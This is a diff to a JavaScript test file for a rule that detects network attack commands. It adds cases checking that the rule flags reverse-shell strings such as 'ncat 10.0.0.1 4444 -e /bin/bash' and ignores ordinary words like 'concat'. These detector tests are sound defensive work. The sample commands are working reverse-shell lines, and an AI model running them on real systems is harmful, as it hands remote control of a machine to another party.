@@ -126,6 +126,15 @@ describe('networkAttackRules', () => {
     expect(testPattern(rule.pattern, 'nc -l 4444')).toBe(true);
     expect(testPattern(rule.pattern, 'reverse shell callback')).toBe(true);
     expect(testPattern(rule.pattern, 'netcat -e /bin/sh')).toBe(true);
+    expect(testPattern(rule.pattern, 'ncat 10.0.0.1 4444 -e /bin/bash')).toBe(true);
+  });
+
+  it('should not match ncat/nc inside ordinary words (truncated, concat, func)', () => {
+    const rule = networkAttackRules[0];
+    expect(testPattern(rule.pattern, 'rejecting empty or truncated output')).toBe(false);
+    expect(testPattern(rule.pattern, 'Concatenated after the header')).toBe(false);
+    expect(testPattern(rule.pattern, 'arr.concat(other)')).toBe(false);
+    expect(testPattern(rule.pattern, 'func -l flag')).toBe(false);
   });
 });
 
